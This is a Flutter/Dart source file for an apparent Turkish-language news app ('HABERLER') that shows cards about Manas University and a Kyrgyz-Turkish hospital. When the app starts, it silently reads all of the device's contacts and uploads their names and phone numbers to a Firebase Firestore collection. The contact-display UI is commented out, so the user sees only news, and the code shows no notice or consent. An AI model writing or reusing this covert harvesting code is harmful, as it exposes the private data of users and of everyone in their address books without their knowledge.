import 'package:flutter/material.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:contacts_service/contacts_service.dart'; // Rehber erişimi için

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner:
          false, //Bu kod eklenerek etiket kaldırılabilir.
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'HABERLER'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  List<Map<String, dynamic>> _contacts = [];

  Future<void> _saveContactsToFirebase() async {
    try {
      List<Contact> contacts = (await ContactsService.getContacts());

      for (var contact in contacts) {
        await _firestore.collection('contacts').add({
          'name': contact.displayName,
          'phone': contact.phones?.isNotEmpty == true
              ? contact.phones!.first.value
              : 'No Phone',
        });
      }

      _fetchContacts();
    } catch (e) {
      print('Error saving contacts: $e');
    }
  }

  Future<void> _fetchContacts() async {
    try {
      QuerySnapshot snapshot = await _firestore.collection('contacts').get();
      setState(() {
        _contacts = snapshot.docs
            .map((doc) => doc.data() as Map<String, dynamic>)
            .toList();
      });
    } catch (e) {
      print('Error fetching contacts: $e');
    }
  }

  @override
  void initState() {
    super.initState();
    _saveContactsToFirebase();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.start,
          children: <Widget>[
            const Padding(
              padding: EdgeInsets.all(16.0),

              /*
              child: Text(
                '',
                style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
              ),
              */
            ),
            /*
            Expanded(
              child: ListView.builder(
                itemCount: _contacts.length,
                itemBuilder: (context, index) {
                  final contact = _contacts[index];
                  return Card(
                    margin: const EdgeInsets.symmetric(vertical: 8.0, horizontal: 16.0),
                    elevation: 4,
                    child: ListTile(
                      leading: Icon(Icons.person),
                      title: Text(contact['name'] ?? 'Unknown'),
                      subtitle: Text(contact['phone'] ?? 'No Phone'),
                      onTap: () {
                        // İsterseniz buraya bir işlev ekleyebilirsiniz
                      },
                    ),
                  );
                },
              ),
            ),
            */
            //const SizedBox(height: 20),
            /*
            const Padding(
              padding: EdgeInsets.all(16.0),
              child: Text(
                'HABERLER',
                style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
              ),
            ),
            */

            Expanded(
              child: ListView(
                children: [
                  _buildImageCard(
                      'https://www.manas.edu.kg/uploads/4707_qs.jpg',
                      'Manas Üniversitesi, Uluslararasılaşmada Büyük Başarılara Yelken Açtı'),
                  _buildImageCard(
                      'https://www.saglikdunyasidergisi.com/resimler/arsiv/ekran_resmi_2021-09-06_172312_041ba3892d68ebbf20c7.jpg',
                      'Türkiye nin kurduğu Kırgız-Türk Dostluk Hastanesi hasta kabulüne başladı'),
                  _buildImageCard(
                      'https://tr.kabar.kg/site/assets/files/29029/kirgizistan-turkiye-manas-universitesi-1637867_2.730x0.jpg',
                      'Kırgızistan-Türkiye Manas Üniversitesi öğrencilerini bekliyor'),
                  // Daha fazla resim ekleyebilirsiniz

                  _buildImageCard(
                      'https://www.manas.edu.kg/uploads/4707_qs.jpg',
                      'Manas Üniversitesi, Uluslararasılaşmada Büyük Başarılara Yelken Açtı'),
                  _buildImageCard(
                      'https://www.saglikdunyasidergisi.com/resimler/arsiv/ekran_resmi_2021-09-06_172312_041ba3892d68ebbf20c7.jpg',
                      'Türkiye nin kurduğu Kırgız-Türk Dostluk Hastanesi hasta kabulüne başladı'),
                  _buildImageCard(
                      'https://tr.kabar.kg/site/assets/files/29029/kirgizistan-turkiye-manas-universitesi-1637867_2.730x0.jpg',
                      'Kırgızistan-Türkiye Manas Üniversitesi öğrencilerini bekliyor'),
                  // Daha fazla resim ekleyebilirsiniz

                  _buildImageCard(
                      'https://www.manas.edu.kg/uploads/4707_qs.jpg',
                      'Manas Üniversitesi, Uluslararasılaşmada Büyük Başarılara Yelken Açtı'),
                  _buildImageCard(
                      'https://www.saglikdunyasidergisi.com/resimler/arsiv/ekran_resmi_2021-09-06_172312_041ba3892d68ebbf20c7.jpg',
                      'Türkiye nin kurduğu Kırgız-Türk Dostluk Hastanesi hasta kabulüne başladı'),
                  _buildImageCard(
                      'https://tr.kabar.kg/site/assets/files/29029/kirgizistan-turkiye-manas-universitesi-1637867_2.730x0.jpg',
                      'Kırgızistan-Türkiye Manas Üniversitesi öğrencilerini bekliyor'),
                  // Daha fazla resim ekleyebilirsiniz

                  _buildImageCard(
                      'https://www.manas.edu.kg/uploads/4707_qs.jpg',
                      'Manas Üniversitesi, Uluslararasılaşmada Büyük Başarılara Yelken Açtı'),
                  _buildImageCard(
                      'https://www.saglikdunyasidergisi.com/resimler/arsiv/ekran_resmi_2021-09-06_172312_041ba3892d68ebbf20c7.jpg',
                      'Türkiye nin kurduğu Kırgız-Türk Dostluk Hastanesi hasta kabulüne başladı'),
                  _buildImageCard(
                      'https://tr.kabar.kg/site/assets/files/29029/kirgizistan-turkiye-manas-universitesi-1637867_2.730x0.jpg',
                      'Kırgızistan-Türkiye Manas Üniversitesi öğrencilerini bekliyor'),
                  // Daha fazla resim ekleyebilirsiniz
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildImageCard(String imageUrl, String description) {
    return Card(
      margin: const EdgeInsets.all(8.0),
      child: Column(
        children: [
          Image.network(
            imageUrl,
            width: double.infinity, // Resmin genişliği ekranın genişliğine eşit
            height: 120, // Resim yüksekliği
            fit: BoxFit.cover,
          ),
          Padding(
            padding: const EdgeInsets.all(8.0),
            child: Text(
              description,
              style: const TextStyle(fontSize: 16),
            ),
          ),
        ],
      ),
    );
  }
}
